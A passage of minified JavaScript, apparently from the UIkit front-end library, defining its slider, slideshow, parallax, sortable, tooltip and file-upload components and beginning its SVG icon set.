        var i = t.length - 1,
            n = Math.min(Math.floor(i * e), i - 1),
            r = t.slice(n, n + 2);
        return r.push(1 === e ? 1 : e % (1 / i) * i), r
    }

    function Or(t, e, i) {
        void 0 === i && (i = 2);
        var n = Dr(t, e),
            r = n[0],
            o = n[1],
            s = n[2];
        return (M(r) ? r + Math.abs(r - o) * s * (r < o ? 1 : -1) : +o).toFixed(i)
    }
    var Br = {
        mixins: [Mr],
        props: {
            target: String,
            viewport: Number,
            easing: Number
        },
        data: {
            target: !1,
            viewport: 1,
            easing: 1
        },
        computed: {
            target: function(t, e) {
                var i = t.target;
                return function t(e) {
                    return e ? "offsetTop" in e ? e : t(e.parentNode) : document.body
                }(i && nt(i, e) || e)
            }
        },
        update: {
            read: function(t, e) {
                var i = t.percent;
                if ("scroll" !== e && (i = !1), t.active) {
                    var n, r, o = i;
                    return n = li(this.target) / (this.viewport || 1), r = this.easing, {
                        percent: i = X(n * (1 - (r - r * n))),
                        style: o !== i && this.getCss(i)
                    }
                }
            },
            write: function(t) {
                var e = t.style;
                t.active ? e && De(this.$el, e) : this.reset()
            },
            events: ["scroll", "resize"]
        }
    };
    var zr = {
        update: {
            write: function() {
                if (!this.stack.length && !this.dragging) {
                    var t = this.getValidIndex();
                    delete this.index, $e(this.slides, this.clsActive, this.clsActivated), this.show(t)
                }
            },
            events: ["resize"]
        }
    };

    function Pr(t, e, i) {
        var n, r = Lr(t, e);
        return i ? r - (n = t, jr(e).width / 2 - jr(n).width / 2) : Math.min(r, Hr(e))
    }

    function Hr(t) {
        return Math.max(0, Fr(t) - jr(t).width)
    }

    function Fr(t) {
        return Vr(t).reduce(function(t, e) {
            return jr(e).width + t
        }, 0)
    }

    function Lr(t, e) {
        return (Qe(t).left + (Ct ? jr(t).width - jr(e).width : 0)) * (Ct ? -1 : 1)
    }

    function jr(t) {
        return t.getBoundingClientRect()
    }

    function Wr(t, e, i) {
        jt(t, Wt(e, !1, !1, i))
    }

    function Vr(t) {
        return L(t.children)
    }
    var Yr = {
            mixins: [Li, kr, zr],
            props: {
                center: Boolean,
                sets: Boolean
            },
            data: {
                center: !1,
                sets: !1,
                attrItem: "uk-slider-item",
                selList: ".uk-slider-items",
                selNav: ".uk-slider-nav",
                clsContainer: "uk-slider-container",
                Transitioner: function(r, n, o, t) {
                    var e = t.center,
                        s = t.easing,
                        a = t.list,
                        h = new Kt,
                        i = r ? Pr(r, a, e) : Pr(n, a, e) + jr(n).width * o,
                        l = n ? Pr(n, a, e) : i + jr(r).width * o * (Ct ? -1 : 1);
                    return {
                        dir: o,
                        show: function(t, e, i) {
                            void 0 === e && (e = 0);
                            var n = i ? "linear" : s;
                            return t -= Math.round(t * X(e, -1, 1)), this.translate(e), r && this.updateTranslates(), e = r ? e : X(e, 0, 1), Wr(this.getItemIn(), "itemin", {
                                percent: e,
                                duration: t,
                                timing: n,
                                dir: o
                            }), r && Wr(this.getItemIn(!0), "itemout", {
                                percent: 1 - e,
                                duration: t,
                                timing: n,
                                dir: o
                            }), Ve.start(a, {
                                transform: wr(-l * (Ct ? -1 : 1), "px")
                            }, t, n).then(h.resolve, K), h.promise
                        },
                        stop: function() {
                            return Ve.stop(a)
                        },
                        cancel: function() {
                            Ve.cancel(a)
                        },
                        reset: function() {
                            De(a, "transform", "")
                        },
                        forward: function(t, e) {
                            return void 0 === e && (e = this.percent()), Ve.cancel(a), this.show(t, e, !0)
                        },
                        translate: function(t) {
                            var e = this.getDistance() * o * (Ct ? -1 : 1);
                            De(a, "transform", wr(X(e - e * t - l, -Fr(a), jr(a).width) * (Ct ? -1 : 1), "px")), this.updateTranslates(), r && (t = X(t, -1, 1), Wr(this.getItemIn(), "itemtranslatein", {
                                percent: t,
                                dir: o
                            }), Wr(this.getItemIn(!0), "itemtranslateout", {
                                percent: 1 - t,
                                dir: o
                            }))
                        },
                        percent: function() {
                            return Math.abs((De(a, "transform").split(",")[4] * (Ct ? -1 : 1) + i) / (l - i))
                        },
                        getDistance: function() {
                            return Math.abs(l - i)
                        },
                        getItemIn: function(t) {
                            void 0 === t && (t = !1);
                            var e = this.getActives(),
                                i = U(Vr(a), "offsetLeft"),
                                n = ne(i, e[0 < o * (t ? -1 : 1) ? e.length - 1 : 0]);
                            return ~n && i[n + (r && !t ? o : 0)]
                        },
                        getActives: function() {
                            var i = Pr(r || n, a, e);
                            return U(Vr(a).filter(function(t) {
                                var e = Lr(t, a);
                                return i <= e && e + jr(t).width <= jr(a).width + i
                            }), "offsetLeft")
                        },
                        updateTranslates: function() {
                            var i = this.getActives();
                            Vr(a).forEach(function(t) {
                                var e = b(i, t);
                                Wr(t, "itemtranslate" + (e ? "in" : "out"), {
                                    percent: e ? 1 : 0,
                                    dir: t.offsetLeft <= n.offsetLeft ? 1 : -1
                                })
                            })
                        }
                    }
                }
            },
            computed: {
                avgWidth: function() {
                    return Fr(this.list) / this.length
                },
                finite: function(t) {
                    return t.finite || Fr(this.list) < jr(this.list).width + Vr(this.list).reduce(function(t, e) {
                        return Math.max(t, jr(e).width)
                    }, 0) + this.center
                },
                maxIndex: function() {
                    if (!this.finite || this.center && !this.sets) return this.length - 1;
                    if (this.center) return this.sets[this.sets.length - 1];
                    De(this.slides, "order", "");
                    for (var t = Hr(this.list), e = this.length; e--;)
                        if (Lr(this.list.children[e], this.list) < t) return Math.min(e + 1, this.length - 1);
                    return 0
                },
                sets: function(t) {
                    var o = this,
                        e = t.sets,
                        s = jr(this.list).width / (this.center ? 2 : 1),
                        a = 0,
                        h = s,
                        l = 0;
                    return (e = e && this.slides.reduce(function(t, e, i) {
                        var n = jr(e).width;
                        if (a < l + n && (!o.center && i > o.maxIndex && (i = o.maxIndex), !b(t, i))) {
                            var r = o.slides[i + 1];
                            o.center && r && n < h - jr(r).width / 2 ? h -= n : (h = s, t.push(i), a = l + s + (o.center ? n / 2 : 0))
                        }
                        return l += n, t
                    }, [])) && e.length && e
                },
                transitionOptions: function() {
                    return {
                        center: this.center,
                        list: this.list
                    }
                }
            },
            connected: function() {
                Ee(this.$el, this.clsContainer, !be("." + this.clsContainer, this.$el))
            },
            update: {
                write: function() {
                    var i = this;
                    ye("[" + this.attrItem + "],[data-" + this.attrItem + "]", this.$el).forEach(function(t) {
                        var e = it(t, i.attrItem);
                        i.maxIndex && Ee(t, "uk-hidden", D(e) && (i.sets && !b(i.sets, P(e)) || e > i.maxIndex))
                    })
                },
                events: ["resize"]
            },
            events: {
                beforeitemshow: function(t) {
                    !this.dragging && this.sets && this.stack.length < 2 && !b(this.sets, this.index) && (this.index = this.getValidIndex());
                    var e = Math.abs(this.index - this.prevIndex + (0 < this.dir && this.index < this.prevIndex || this.dir < 0 && this.index > this.prevIndex ? (this.maxIndex + 1) * this.dir : 0));
                    if (!this.dragging && 1 < e) {
                        for (var i = 0; i < e; i++) this.stack.splice(1, 0, 0 < this.dir ? "next" : "previous");
                        t.preventDefault()
                    } else this.duration = $r(this.avgWidth / this.velocity) * (jr(this.dir < 0 || !this.slides[this.prevIndex] ? this.slides[this.index] : this.slides[this.prevIndex]).width / this.avgWidth), this.reorder()
                },
                itemshow: function() {
                    !O(this.prevIndex) && ke(this._getTransitioner().getItemIn(), this.clsActive)
                },
                itemshown: function() {
                    var e = this,
                        i = this._getTransitioner(this.index).getActives();
                    this.slides.forEach(function(t) {
                        return Ee(t, e.clsActive, b(i, t))
                    }), (!this.sets || b(this.sets, P(this.index))) && this.slides.forEach(function(t) {
                        return Ee(t, e.clsActivated, b(i, t))
                    })
                }
            },
            methods: {
                reorder: function() {
                    var i = this;
                    if (De(this.slides, "order", ""), !this.finite) {
                        var n = 0 < this.dir && this.slides[this.prevIndex] ? this.prevIndex : this.index;
                        if (this.slides.forEach(function(t, e) {
                                return De(t, "order", 0 < i.dir && e < n ? 1 : i.dir < 0 && e >= i.index ? -1 : "")
                            }), this.center)
                            for (var t = this.slides[n], e = jr(this.list).width / 2 - jr(t).width / 2, r = 0; 0 < e;) {
                                var o = this.getIndex(--r + n, n),
                                    s = this.slides[o];
                                De(s, "order", n < o ? -2 : -1), e -= jr(s).width
                            }
                    }
                },
                getValidIndex: function(t, e) {
                    if (void 0 === t && (t = this.index), void 0 === e && (e = this.prevIndex), t = this.getIndex(t, e), !this.sets) return t;
                    var i;
                    do {
                        if (b(this.sets, t)) return t;
                        i = t, t = this.getIndex(t + this.dir, e)
                    } while (t !== i);
                    return t
                }
            }
        },
        Rr = {
            mixins: [Mr],
            data: {
                selItem: "!li"
            },
            computed: {
                item: function(t, e) {
                    return nt(t.selItem, e)
                }
            },
            events: [{
                name: "itemshown",
                self: !0,
                el: function() {
                    return this.item
                },
                handler: function() {
                    De(this.$el, this.getCss(.5))
                }
            }, {
                name: "itemin itemout",
                self: !0,
                el: function() {
                    return this.item
                },
                handler: function(t) {
                    var e = t.type,
                        i = t.detail,
                        n = i.percent,
                        r = i.duration,
                        o = i.timing,
                        s = i.dir;
                    Ve.cancel(this.$el), De(this.$el, this.getCss(Ur(e, s, n))), Ve.start(this.$el, this.getCss(qr(e) ? .5 : 0 < s ? 1 : 0), r, o).catch(K)
                }
            }, {
                name: "transitioncanceled transitionend",
                self: !0,
                el: function() {
                    return this.item
                },
                handler: function() {
                    Ve.cancel(this.$el)
                }
            }, {
                name: "itemtranslatein itemtranslateout",
                self: !0,
                el: function() {
                    return this.item
                },
                handler: function(t) {
                    var e = t.type,
                        i = t.detail,
                        n = i.percent,
                        r = i.dir;
                    Ve.cancel(this.$el), De(this.$el, this.getCss(Ur(e, r, n)))
                }
            }]
        };

    function qr(t) {
        return u(t, "in")
    }

    function Ur(t, e, i) {
        return i /= 2, qr(t) ? e < 0 ? 1 - i : i : e < 0 ? i : 1 - i
    }
    var Xr, Kr = R({}, gr, {
            fade: {
                show: function() {
                    return [{
                        opacity: 0,
                        zIndex: 0
                    }, {
                        zIndex: -1
                    }]
                },
                percent: function(t) {
                    return 1 - De(t, "opacity")
                },
                translate: function(t) {
                    return [{
                        opacity: 1 - t,
                        zIndex: 0
                    }, {
                        zIndex: -1
                    }]
                }
            },
            scale: {
                show: function() {
                    return [{
                        opacity: 0,
                        transform: br(1.5),
                        zIndex: 0
                    }, {
                        zIndex: -1
                    }]
                },
                percent: function(t) {
                    return 1 - De(t, "opacity")
                },
                translate: function(t) {
                    return [{
                        opacity: 1 - t,
                        transform: br(1 + .5 * t),
                        zIndex: 0
                    }, {
                        zIndex: -1
                    }]
                }
            },
            pull: {
                show: function(t) {
                    return t < 0 ? [{
                        transform: wr(30),
                        zIndex: -1
                    }, {
                        transform: wr(),
                        zIndex: 0
                    }] : [{
                        transform: wr(-100),
                        zIndex: 0
                    }, {
                        transform: wr(),
                        zIndex: -1
                    }]
                },
                percent: function(t, e, i) {
                    return i < 0 ? 1 - vr(e) : vr(t)
                },
                translate: function(t, e) {
                    return e < 0 ? [{
                        transform: wr(30 * t),
                        zIndex: -1
                    }, {
                        transform: wr(-100 * (1 - t)),
                        zIndex: 0
                    }] : [{
                        transform: wr(100 * -t),
                        zIndex: 0
                    }, {
                        transform: wr(30 * (1 - t)),
                        zIndex: -1
                    }]
                }
            },
            push: {
                show: function(t) {
                    return t < 0 ? [{
                        transform: wr(100),
                        zIndex: 0
                    }, {
                        transform: wr(),
                        zIndex: -1
                    }] : [{
                        transform: wr(-30),
                        zIndex: -1
                    }, {
                        transform: wr(),
                        zIndex: 0
                    }]
                },
                percent: function(t, e, i) {
                    return 0 < i ? 1 - vr(e) : vr(t)
                },
                translate: function(t, e) {
                    return e < 0 ? [{
                        transform: wr(100 * t),
                        zIndex: 0
                    }, {
                        transform: wr(-30 * (1 - t)),
                        zIndex: -1
                    }] : [{
                        transform: wr(-30 * t),
                        zIndex: -1
                    }, {
                        transform: wr(100 * (1 - t)),
                        zIndex: 0
                    }]
                }
            }
        }),
        Gr = {
            mixins: [Li, Ir, zr],
            props: {
                ratio: String,
                minHeight: Boolean,
                maxHeight: Boolean
            },
            data: {
                ratio: "16:9",
                minHeight: !1,
                maxHeight: !1,
                selList: ".uk-slideshow-items",
                attrItem: "uk-slideshow-item",
                selNav: ".uk-slideshow-nav",
                Animations: Kr
            },
            update: {
                read: function() {
                    var t = this.ratio.split(":").map(Number),
                        e = t[0],
                        i = t[1];
                    return i = i * this.list.offsetWidth / e, this.minHeight && (i = Math.max(this.minHeight, i)), this.maxHeight && (i = Math.min(this.maxHeight, i)), {
                        height: i - ni(this.list, "content-box")
                    }
                },
                write: function(t) {
                    var e = t.height;
                    De(this.list, "minHeight", e)
                },
                events: ["resize"]
            }
        },
        Jr = {
            mixins: [Li, lr],
            props: {
                group: String,
                threshold: Number,
                clsItem: String,
                clsPlaceholder: String,
                clsDrag: String,
                clsDragState: String,
                clsBase: String,
                clsNoDrag: String,
                clsEmpty: String,
                clsCustom: String,
                handle: String
            },
            data: {
                group: !1,
                threshold: 5,
                clsItem: "uk-sortable-item",
                clsPlaceholder: "uk-sortable-placeholder",
                clsDrag: "uk-sortable-drag",
                clsDragState: "uk-drag",
                clsBase: "uk-sortable",
                clsNoDrag: "uk-sortable-nodrag",
                clsEmpty: "uk-sortable-empty",
                clsCustom: "",
                handle: !1
            },
            created: function() {
                var o = this;
                ["init", "start", "move", "end"].forEach(function(t) {
                    var r = o[t];
                    o[t] = function(t) {
                        o.scrollY = window.pageYOffset;
                        var e = Di(t, "page"),
                            i = e.x,
                            n = e.y;
                        o.pos = {
                            x: i,
                            y: n
                        }, r(t)
                    }
                })
            },
            events: {
                name: Mt,
                passive: !1,
                handler: "init"
            },
            update: {
                write: function() {
                    if (this.clsEmpty && Ee(this.$el, this.clsEmpty, !this.$el.children.length), De(this.handle ? ye(this.handle, this.$el) : this.$el.children, "touchAction", "none"), this.drag) {
                        Je(this.drag, {
                            top: this.pos.y + this.origin.top,
                            left: this.pos.x + this.origin.left
                        });
                        var t, e = Je(this.drag),
                            i = e.top,
                            n = i + e.height;
                        0 < i && i < this.scrollY ? t = this.scrollY - 5 : n < ti(document) && n > ti(window) + this.scrollY && (t = this.scrollY + 5), t && setTimeout(function() {
                            return ci(window, t)
                        }, 5)
                    }
                }
            },
            methods: {
                init: function(t) {
                    var e = t.target,
                        i = t.button,
                        n = t.defaultPrevented,
                        r = L(this.$el.children).filter(function(t) {
                            return Tt(e, t)
                        })[0];
                    !r || It(e) || this.handle && !Tt(e, this.handle) || 0 < i || Tt(e, "." + this.clsNoDrag) || n || (t.preventDefault(), this.touched = [this], this.placeholder = r, this.origin = R({
                        target: e,
                        index: ne(r)
                    }, this.pos), Ht(document, Dt, this.move), Ht(document, Ot, this.end), Ht(window, "scroll", this.scroll), this.threshold || this.start(t))
                },
                start: function(t) {
                    this.drag = ae(this.$container, this.placeholder.outerHTML.replace(/^<li/i, "<div").replace(/li>$/i, "div>")), De(this.drag, R({
                        boxSizing: "border-box",
                        width: this.placeholder.offsetWidth,
                        height: this.placeholder.offsetHeight
                    }, De(this.placeholder, ["paddingLeft", "paddingRight", "paddingTop", "paddingBottom"]))), Q(this.drag, "uk-no-boot", ""), ke(this.drag, this.clsDrag, this.clsCustom), ti(this.drag.firstElementChild, ti(this.placeholder.firstElementChild));
                    var e = Je(this.placeholder),
                        i = e.left,
                        n = e.top;
                    R(this.origin, {
                        left: i - this.pos.x,
                        top: n - this.pos.y
                    }), ke(this.placeholder, this.clsPlaceholder), ke(this.$el.children, this.clsItem), ke(document.documentElement, this.clsDragState), jt(this.$el, "start", [this, this.placeholder]), this.move(t)
                },
                move: function(t) {
                    if (this.drag) {
                        this.$emit();
                        var e = "mousemove" === t.type ? t.target : document.elementFromPoint(this.pos.x - window.pageXOffset, this.pos.y - window.pageYOffset),
                            i = this.getSortable(e),
                            n = this.getSortable(this.placeholder),
                            r = i !== n;
                        if (i && !Tt(e, this.placeholder) && (!r || i.group && i.group === n.group)) {
                            if (e = i.$el === e.parentNode && e || L(i.$el.children).filter(function(t) {
                                    return Tt(e, t)
                                })[0], r) n.remove(this.placeholder);
                            else if (!e) return;
                            i.insert(this.placeholder, e), b(this.touched, i) || this.touched.push(i)
                        }
                    } else(Math.abs(this.pos.x - this.origin.x) > this.threshold || Math.abs(this.pos.y - this.origin.y) > this.threshold) && this.start(t)
                },
                end: function(t) {
                    if (Ft(document, Dt, this.move), Ft(document, Ot, this.end), Ft(window, "scroll", this.scroll), this.drag) {
                        Ut();
                        var e = this.getSortable(this.placeholder);
                        this === e ? this.origin.index !== ne(this.placeholder) && jt(this.$el, "moved", [this, this.placeholder]) : (jt(e.$el, "added", [e, this.placeholder]), jt(this.$el, "removed", [this, this.placeholder])), jt(this.$el, "stop", [this, this.placeholder]), ue(this.drag), this.drag = null;
                        var i = this.touched.map(function(t) {
                            return t.clsPlaceholder + " " + t.clsItem
                        }).join(" ");
                        this.touched.forEach(function(t) {
                            return $e(t.$el.children, i)
                        }), $e(document.documentElement, this.clsDragState)
                    } else "touchend" === t.type && t.target.click()
                },
                scroll: function() {
                    var t = window.pageYOffset;
                    t !== this.scrollY && (this.pos.y += t - this.scrollY, this.scrollY = t, this.$emit())
                },
                insert: function(i, n) {
                    var r = this;
                    ke(this.$el.children, this.clsItem);
                    var t = function() {
                        var t, e;
                        n ? !Tt(i, r.$el) || (e = n, (t = i).parentNode === e.parentNode && ne(t) > ne(e)) ? he(n, i) : le(n, i) : ae(r.$el, i)
                    };
                    this.animation ? this.animate(t) : t()
                },
                remove: function(t) {
                    Tt(t, this.$el) && (this.animation ? this.animate(function() {
                        return ue(t)
                    }) : ue(t))
                },
                getSortable: function(t) {
                    return t && (this.$getComponent(t, "sortable") || this.getSortable(t.parentNode))
                }
            }
        };
    var Zr = [],
        Qr = {
            mixins: [jn, ji, Ki],
            args: "title",
            props: {
                delay: Number,
                title: String
            },
            data: {
                pos: "top",
                title: "",
                delay: 0,
                animation: ["uk-animation-scale-up"],
                duration: 100,
                cls: "uk-active",
                clsPos: "uk-tooltip"
            },
            beforeConnect: function() {
                this._hasTitle = tt(this.$el, "title"), Q(this.$el, {
                    title: "",
                    "aria-expanded": !1
                })
            },
            disconnected: function() {
                this.hide(), Q(this.$el, {
                    title: this._hasTitle ? this.title : null,
                    "aria-expanded": null
                })
            },
            methods: {
                show: function() {
                    var e = this;
                    b(Zr, this) || (Zr.forEach(function(t) {
                        return t.hide()
                    }), Zr.push(this), this._unbind = Ht(document, Ot, function(t) {
                        return !Tt(t.target, e.$el) && e.hide()
                    }), clearTimeout(this.showTimer), this.showTimer = setTimeout(function() {
                        e._show(), e.hideTimer = setInterval(function() {
                            kt(e.$el) || e.hide()
                        }, 150)
                    }, this.delay))
                },
                hide: function() {
                    var t = Zr.indexOf(this);
                    !~t || pt(this.$el, "input") && this.$el === document.activeElement || (Zr.splice(t, 1), clearTimeout(this.showTimer), clearInterval(this.hideTimer), Q(this.$el, "aria-expanded", !1), this.toggleElement(this.tooltip, !1), this.tooltip && ue(this.tooltip), this.tooltip = !1, this._unbind())
                },
                _show: function() {
                    this.tooltip = ae(this.container, '<div class="' + this.clsPos + '" aria-expanded="true" aria-hidden> <div class="' + this.clsPos + '-inner">' + this.title + "</div> </div>"), this.positionAt(this.tooltip, this.$el), this.origin = "y" === this.getAxis() ? ai(this.dir) + "-" + this.align : this.align + "-" + ai(this.dir), this.toggleElement(this.tooltip, !0)
                }
            },
            events: (Xr = {}, Xr["focus " + Bt + " " + Mt] = function(t) {
                t.type === Mt && Mi(t) || this.show()
            }, Xr.blur = "hide", Xr[zt] = function(t) {
                Mi(t) || this.hide()
            }, Xr)
        },
        to = {
            props: {
                allow: String,
                clsDragover: String,
                concurrent: Number,
                maxSize: Number,
                method: String,
                mime: String,
                msgInvalidMime: String,
                msgInvalidName: String,
                msgInvalidSize: String,
                multiple: Boolean,
                name: String,
                params: Object,
                type: String,
                url: String
            },
            data: {
                allow: !1,
                clsDragover: "uk-dragover",
                concurrent: 1,
                maxSize: 0,
                method: "POST",
                mime: !1,
                msgInvalidMime: "Invalid File Type: %s",
                msgInvalidName: "Invalid File Name: %s",
                msgInvalidSize: "Invalid File Size: %s Kilobytes Max",
                multiple: !1,
                name: "files[]",
                params: {},
                type: "",
                url: "",
                abort: K,
                beforeAll: K,
                beforeSend: K,
                complete: K,
                completeAll: K,
                error: K,
                fail: K,
                load: K,
                loadEnd: K,
                loadStart: K,
                progress: K
            },
            events: {
                change: function(t) {
                    pt(t.target, 'input[type="file"]') && (t.preventDefault(), t.target.files && this.upload(t.target.files), t.target.value = "")
                },
                drop: function(t) {
                    io(t);
                    var e = t.dataTransfer;
                    e && e.files && ($e(this.$el, this.clsDragover), this.upload(e.files))
                },
                dragenter: function(t) {
                    io(t)
                },
                dragover: function(t) {
                    io(t), ke(this.$el, this.clsDragover)
                },
                dragleave: function(t) {
                    io(t), $e(this.$el, this.clsDragover)
                }
            },
            methods: {
                upload: function(t) {
                    var n = this;
                    if (t.length) {
                        jt(this.$el, "upload", [t]);
                        for (var e = 0; e < t.length; e++) {
                            if (this.maxSize && 1e3 * this.maxSize < t[e].size) return void this.fail(this.msgInvalidSize.replace("%s", this.maxSize));
                            if (this.allow && !eo(this.allow, t[e].name)) return void this.fail(this.msgInvalidName.replace("%s", this.allow));
                            if (this.mime && !eo(this.mime, t[e].type)) return void this.fail(this.msgInvalidMime.replace("%s", this.mime))
                        }
                        this.multiple || (t = [t[0]]), this.beforeAll(this, t);
                        var r = function(t, e) {
                                for (var i = [], n = 0; n < t.length; n += e) {
                                    for (var r = [], o = 0; o < e; o++) r.push(t[n + o]);
                                    i.push(r)
                                }
                                return i
                            }(t, this.concurrent),
                            o = function(t) {
                                var e = new FormData;
                                for (var i in t.forEach(function(t) {
                                        return e.append(n.name, t)
                                    }), n.params) e.append(i, n.params[i]);
                                te(n.url, {
                                    data: e,
                                    method: n.method,
                                    responseType: n.type,
                                    beforeSend: function(t) {
                                        var e = t.xhr;
                                        e.upload && Ht(e.upload, "progress", n.progress), ["loadStart", "load", "loadEnd", "abort"].forEach(function(t) {
                                            return Ht(e, t.toLowerCase(), n[t])
                                        }), n.beforeSend(t)
                                    }
                                }).then(function(t) {
                                    n.complete(t), r.length ? o(r.shift()) : n.completeAll(t)
                                }, function(t) {
                                    return n.error(t)
                                })
                            };
                        o(r.shift())
                    }
                }
            }
        };

    function eo(t, e) {
        return e.match(new RegExp("^" + t.replace(/\//g, "\\/").replace(/\*\*/g, "(\\/[^\\/]+)*").replace(/\*/g, "[^\\/]+").replace(/((?!\\))\?/g, "$1.") + "$", "i"))
    }

    function io(t) {
        t.preventDefault(), t.stopPropagation()
    }
    return Fi.component("countdown", sr), Fi.component("filter", fr), Fi.component("lightbox", Cr), Fi.component("lightboxPanel", Sr), Fi.component("notification", Nr), Fi.component("parallax", Br), Fi.component("slider", Yr), Fi.component("sliderParallax", Rr), Fi.component("slideshow", Gr), Fi.component("slideshowParallax", Rr), Fi.component("sortable", Jr), Fi.component("tooltip", Qr), Fi.component("upload", to),
        function(o) {
            var s = o.connect,
                a = o.disconnect;

            function t() {
                h(document.body, s), pi.flush(), new MutationObserver(function(t) {
                    return t.forEach(e)
                }).observe(document, {
                    childList: !0,
                    subtree: !0,
                    characterData: !0,
                    attributes: !0
                }), o._initialized = !0
            }

            function e(t) {
                var e = t.target;
                ("attributes" !== t.type ? function(t) {
                    for (var e = t.addedNodes, i = t.removedNodes, n = 0; n < e.length; n++) h(e[n], s);
                    for (var r = 0; r < i.length; r++) h(i[r], a);
                    return !0
                }(t) : function(t) {
                    var e = t.target,
                        i = t.attributeName;
                    if ("href" === i) return !0;
                    var n = Oi(i);
                    if (n && n in o) {
                        if (tt(e, i)) return o[n](e), !0;
                        var r = o.getComponent(e, n);
                        return r ? (r.$destroy(), !0) : void 0
                    }
                }(t)) && o.update(e)
            }

            function h(t, e) {
                if (1 === t.nodeType && !tt(t, "uk-no-boot"))
                    for (e(t), t = t.firstElementChild; t;) {
                        var i = t.nextElementSibling;
                        h(t, e), t = i
                    }
            }
            "MutationObserver" in window && (document.body ? t() : new MutationObserver(function() {
                document.body && (this.disconnect(), t())
            }).observe(document, {
                childList: !0,
                subtree: !0
            }))
        }(Fi), Fi
});
! function(t, i) {
    "object" == typeof exports && "undefined" != typeof module ? module.exports = i() : "function" == typeof define && define.amd ? define("uikiticons", i) : (t = t || self).UIkitIcons = i()
}(this, function() {
    "use strict";

    function i(t) {
        i.installed || t.icon.add({
            "500px": '<svg width="20" height="20" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><path d="M9.624,11.866c-0.141,0.132,0.479,0.658,0.662,0.418c0.051-0.046,0.607-0.61,0.662-0.664c0,0,0.738,0.719,0.814,0.719 c0.1,0,0.207-0.055,0.322-0.17c0.27-0.269,0.135-0.416,0.066-0.495l-0.631-0.616l0.658-0.668c0.146-0.156,0.021-0.314-0.1-0.449 c-0.182-0.18-0.359-0.226-0.471-0.125l-0.656,0.654l-0.654-0.654c-0.033-0.034-0.08-0.045-0.124-0.045 c-0.079,0-0.191,0.068-0.307,0.181c-0.202,0.202-0.247,0.351-0.133,0.462l0.665,0.665L9.624,11.866z"/><path d="M11.066,2.884c-1.061,0-2.185,0.248-3.011,0.604c-0.087,0.034-0.141,0.106-0.15,0.205C7.893,3.784,7.919,3.909,7.982,4.066 c0.05,0.136,0.187,0.474,0.452,0.372c0.844-0.326,1.779-0.507,2.633-0.507c0.963,0,1.9,0.191,2.781,0.564 c0.695,0.292,1.357,0.719,2.078,1.34c0.051,0.044,0.105,0.068,0.164,0.068c0.143,0,0.273-0.137,0.389-0.271 c0.191-0.214,0.324-0.395,0.135-0.575c-0.686-0.654-1.436-1.138-2.363-1.533C13.24,3.097,12.168,2.884,11.066,2.884z"/><path d="M16.43,15.747c-0.092-0.028-0.242,0.05-0.309,0.119l0,0c-0.652,0.652-1.42,1.169-2.268,1.521 c-0.877,0.371-1.814,0.551-2.779,0.551c-0.961,0-1.896-0.189-2.775-0.564c-0.848-0.36-1.612-0.879-2.268-1.53 c-0.682-0.688-1.196-1.455-1.529-2.268c-0.325-0.799-0.471-1.643-0.471-1.643c-0.045-0.24-0.258-0.249-0.567-0.203 c-0.128,0.021-0.519,0.079-0.483,0.36v0.01c0.105,0.644,0.289,1.284,0.545,1.895c0.417,0.969,1.002,1.849,1.756,2.604 c0.757,0.754,1.636,1.34,2.604,1.757C8.901,18.785,9.97,19,11.088,19c1.104,0,2.186-0.215,3.188-0.645 c1.838-0.896,2.604-1.757,2.604-1.757c0.182-0.204,0.227-0.317-0.1-0.643C16.779,15.956,16.525,15.774,16.43,15.747z"/><path d="M5.633,13.287c0.293,0.71,0.723,1.341,1.262,1.882c0.54,0.54,1.172,0.971,1.882,1.264c0.731,0.303,1.509,0.461,2.298,0.461 c0.801,0,1.578-0.158,2.297-0.461c0.711-0.293,1.344-0.724,1.883-1.264c0.543-0.541,0.971-1.172,1.264-1.882 c0.314-0.721,0.463-1.5,0.463-2.298c0-0.79-0.148-1.569-0.463-2.289c-0.293-0.699-0.721-1.329-1.264-1.881 c-0.539-0.541-1.172-0.959-1.867-1.263c-0.721-0.303-1.5-0.461-2.299-0.461c-0.802,0-1.613,0.159-2.322,0.461 c-0.577,0.25-1.544,0.867-2.119,1.454v0.012V2.108h8.16C15.1,2.104,15.1,1.69,15.1,1.552C15.1,1.417,15.1,1,14.809,1H5.915 C5.676,1,5.527,1.192,5.527,1.384v6.84c0,0.214,0.273,0.372,0.529,0.428c0.5,0.105,0.614-0.056,0.737-0.224l0,0 c0.18-0.273,0.776-0.884,0.787-0.894c0.901-0.905,2.117-1.408,3.416-1.408c1.285,0,2.5,0.501,3.412,1.408 c0.914,0.914,1.408,2.122,1.408,3.405c0,1.288-0.508,2.496-1.408,3.405c-0.9,0.896-2.152,1.406-3.438,1.406 c-0.877,0-1.711-0.229-2.433-0.671v-4.158c0-0.553,0.237-1.151,0.643-1.614c0.462-0.519,1.094-0.799,1.782-0.799 c0.664,0,1.293,0.253,1.758,0.715c0.459,0.459,0.709,1.071,0.709,1.723c0,1.385-1.094,2.468-2.488,2.468 c-0.273,0-0.769-0.121-0.781-0.125c-0.281-0.087-0.405,0.306-0.438,0.436c-0.159,0.496,0.079,0.585,0.123,0.607 c0.452,0.137,0.743,0.157,1.129,0.157c1.973,0,3.572-1.6,3.572-3.57c0-1.964-1.6-3.552-3.572-3.552c-0.97,0-1.872,0.36-2.546,1.038 c-0.656,0.631-1.027,1.487-1.027,2.322v3.438v-0.011c-0.372-0.42-0.732-1.041-0.981-1.682c-0.102-0.248-0.315-0.202-0.607-0.113 c-0.135,0.035-0.519,0.157-0.44,0.439C5.372,12.799,5.577,13.164,5.633,13.287z"/></svg>',
            album: '<svg width="20" height="20" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><rect x="5" y="2" width="10" height="1"/><rect x="3" y="4" width="14" height="1"/><rect fill="none" stroke="#000" x="1.5" y="6.5" width="17" height="11"/></svg>',
            "arrow-down": '<svg width="20" height="20" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><polygon points="10.5,16.08 5.63,10.66 6.37,10 10.5,14.58 14.63,10 15.37,10.66"/><line fill="none" stroke="#000" x1="10.5" y1="4" x2="10.5" y2="15"/></svg>',
            "arrow-left": '<svg width="20" height="20" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><polyline fill="none" stroke="#000" points="10 14 5 9.5 10 5"/><line fill="none" stroke="#000" x1="16" y1="9.5" x2="5" y2="9.52"/></svg>',
            "arrow-right": '<svg width="20" height="20" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><polyline fill="none" stroke="#000" points="10 5 15 9.5 10 14"/><line fill="none" stroke="#000" x1="4" y1="9.5" x2="15" y2="9.5"/></svg>',
